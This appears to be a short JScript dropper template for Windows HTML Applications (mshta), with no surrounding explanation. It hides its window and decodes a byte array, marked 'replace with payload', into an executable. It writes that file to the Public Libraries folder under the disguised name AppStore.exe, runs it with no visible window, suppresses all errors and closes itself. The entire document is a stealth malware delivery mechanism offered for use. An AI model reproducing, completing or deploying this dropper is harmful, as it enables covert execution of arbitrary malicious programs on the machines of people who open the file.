window.resizeTo(0, 0)
try {
  var data = [104,101,108,108,111,32,102,114,111,109,32,109,115,104,116,97] // replace with payload
  var path = "C:\\Users\\Public\\Libraries\\AppStore.exe"
  var fso = new ActiveXObject("Scripting.FileSystemObject")

  var content = []
  for (var i = 0; i < data.length; i++) {
    content.push(String.fromCharCode(data[i]))
  }

  var file = fso.CreateTextFile(path, true)
  file.Write("MZ")
  file.Close()

  file = fso.OpenTextFile(path, 8, false, -1)
  file.Write(content)
  file.Close()
  var shell = new ActiveXObject("WScript.Shell")
  shell.Run(path, 0)

} catch (error) {}
window.close()

